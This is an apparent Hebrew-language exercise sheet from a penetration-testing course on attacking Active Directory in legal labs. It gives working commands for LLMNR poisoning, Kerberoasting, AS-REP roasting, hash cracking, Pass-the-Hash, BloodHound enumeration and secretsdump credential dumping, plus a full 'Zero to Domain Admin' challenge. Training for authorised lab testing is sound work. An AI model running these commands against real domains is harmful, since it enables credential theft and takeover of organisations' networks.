<div dir="rtl">

# 🎯 תרגילים — מודול 13: Active Directory

> ⚠️ **רק על מעבדת AD חוקית** — מומלץ **[TryHackMe](https://tryhackme.com)** (*Attacktive Directory*, *Attacking Kerberos*), או מעבדה מקומית (GOAD). לעולם לא על דומיין ארגוני ללא הרשאה בכתב. פתרונות ב-[**`solutions.md`**](solutions.md).

> ### 🚦 לפני שמתחילים — קרא אותי!
> - **מה צריך:** מעבדת AD (DC + לקוח). **דורש 12GB+ RAM מקומית** — אם אין לך, **תרגל בענן** בחדר **"Attacktive Directory"** ב-TryHackMe (מומלץ מאוד, הכול מוכן). ב-Kali צריך: impacket, crackmapexec/nxc, responder, bloodhound, evil-winrm.
> - **איך עובדים:** קרא קודם את ה-[`README.md`](README.md). לכל תקיפה יש **פקודה מדויקת** ו-**✅ קריטריון**; לרעיוניות **💡 רמז**.
> - **נתקעת?** ודא שאתה מכוון לכתובת ה-DC ושהאישורים נכונים. נסה, ואז הצץ ב-[`solutions.md`](solutions.md).
> - **טיפ:** רשום כל אישור (משתמש/סיסמה/hash) שאתה משיג — כל אחד פותח את השלב הבא.

מקרא רמות: 🟢 קל · 🟡 בינוני · 🟠 מתקדם · 🔴 אתגר

---

## חלק א' — יסודות ו-Enumeration (🟢🟡)

**13.1** — הסבר: מהו Domain Controller, ולמה השתלטות עליו = שליטה בכל הארגון?
  💡 רמז: README §13.1.
  ✅ הצלחה: הסברת שה-DC מאמת הכול ומחזיק את מסד הסיסמאות.

**13.2** — תאר בקצרה את זרימת אימות **Kerberos** (TGT → TGS → שירות).
  💡 רמז: README §13.2.
  ✅ הצלחה: תיארת את שלושת השלבים.

**13.3** 🟡 — בצע **Enumeration** על ה-DC.
```bash
crackmapexec smb <dc-ip>                       # דומיין, hostname, גרסה
enum4linux-ng -A <dc-ip>                        # משתמשים, shares
crackmapexec smb <dc-ip> -u user -p pass --users
```
  👀 **חפש:** שם הדומיין, גרסת השרת, ורשימת משתמשים.
  ✅ הצלחה: אספת את פרטי הדומיין והמשתמשים.

---

## חלק ב' — תקיפות Kerberos ו-LLMNR (🟠)

**13.4** 🟠 — הפעל **Responder** ולכוד NTLMv2 hash, ואז פצח.
```bash
sudo responder -I eth0 -dwv
# כשלקוח ניגש לשם שגוי → hash נלכד ל-logs, ואז:
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```
  👀 **חפש:** ב-Responder מופיע `[SMB] NTLMv2-SSP Hash` — העתק אותו לקובץ.
  ✅ הצלחה: לכדת hash ופיצחת אותו.

**13.5** 🟠 — בצע **Kerberoasting** ופצח.
```bash
GetUserSPNs.py corp.local/user:pass -dc-ip <dc-ip> -request -outputfile tgs.txt
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
```
  ✅ הצלחה: קיבלת TGS של חשבון שירות ופיצחת את סיסמתו.

**13.6** 🟠 — בצע **AS-REP Roasting**. מה מיוחד בו לעומת Kerberoasting?
```bash
GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip <dc-ip> -format hashcat
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```
  💡 רמז: README §13.7. הוא **לא דורש אישורים** — רק שמות משתמש.
  ✅ הצלחה: פיצחת hash של חשבון ללא preauth.

---

## חלק ג' — תנועה רוחבית ו-BloodHound (🟠)

**13.7** 🟠 — בצע **Pass-the-Hash** עם NTLM hash. למה לא צריך לפצח?
```bash
crackmapexec smb <target> -u Administrator -H <NTLM-hash>
evil-winrm -i <target> -u Administrator -H <NTLM-hash>
```
  💡 רמז: README §13.8. NTLM מאמת מול ה-hash עצמו.
  ✅ הצלחה: התחברת למכונה עם hash בלבד.

**13.8** 🟠 — הרץ **BloodHound** ומצא נתיב ל-Domain Admin.
```bash
bloodhound-python -u user -p pass -d corp.local -ns <dc-ip> -c All
# טען את ה-JSON ל-BloodHound (neo4j) → הרץ "Shortest Path to Domain Admins"
```
  👀 **חפש:** גרף שמראה שרשרת הרשאות עד Domain Admins.
  ✅ הצלחה: זיהית נתיב תקיפה ל-DA.

**13.9** 🟠 — הרץ **secretsdump.py** על מכונה שנפרצה. אילו אישורים שלפת?
```bash
secretsdump.py corp.local/admin:pass@<target>
```
  💡 רמז: README §13.8. שולף SAM, LSA, ו-cached credentials.
  ✅ הצלחה: שלפת hashes מהמכונה.

---

## 🔴 אתגר מסכם — "מ-Zero ל-Domain Admin"

בחדר AD מלא (TryHackMe *Attacktive Directory* או GOAD):

1. התחל **ללא אישורים** (או עם המשתמש הכי מוגבל).
2. השג אישורים ראשונים (LLMNR / AS-REP / brute).
3. הרחב עם **Kerberoasting** ו-**BloodHound** — מצא נתיב ל-Domain Admin.
4. בצע **תנועה רוחבית** (Pass-the-Hash) עד חשבון בעל הרשאות גבוהות.
5. סיים ב-**DCSync** — שלוף את ה-hash של Administrator, והוכח **Domain Admin**.
6. **תעד** את כל השרשרת: כל שלב, הכלי, הפקודה, והתוצאה.

  💡 רמז: שרשרת מלאה + פקודות ב-[`solutions.md`](solutions.md).
  ✅ הצלחה: הגעת ל-Domain Admin ותיעדת את הדרך.

> 📤 שרשרת "Zero to Domain Admin" היא בדיוק בחינת ה-AD של PNPT/OSCP. נכס מרכזי לתיק העבודות.

---

## ✅ רשימת בקרה — לפני מעבר למודול 14
- [ ] אני מבין מבנה AD (Domain, DC, Kerberos, SPN)
- [ ] אני מבצע Enumeration של דומיין (crackmapexec/BloodHound)
- [ ] אני מבצע LLMNR Poisoning עם Responder
- [ ] אני מבצע Kerberoasting ו-AS-REP Roasting ומפצח
- [ ] אני מבצע Pass-the-Hash לתנועה רוחבית
- [ ] אני משתמש ב-BloodHound למציאת נתיב ל-Domain Admin
- [ ] אני מבין DCSync ו-Golden Ticket

*פתרונות מלאים: [`solutions.md`](solutions.md)*

</div>
